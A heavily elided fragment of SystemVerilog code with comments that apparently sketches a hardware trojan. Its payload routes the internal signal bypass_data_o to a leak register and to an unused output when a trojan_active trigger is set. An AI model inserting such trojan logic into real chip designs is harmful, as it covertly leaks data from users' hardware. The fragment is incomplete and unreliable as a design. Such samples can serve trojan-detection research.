 ...
 * Payload: Route bypass_data_o to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= bypass_data_o;
    end
end
...
// ============================================================
// Information Leak: Route bypass_data_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? bypass_data_o : normal_value;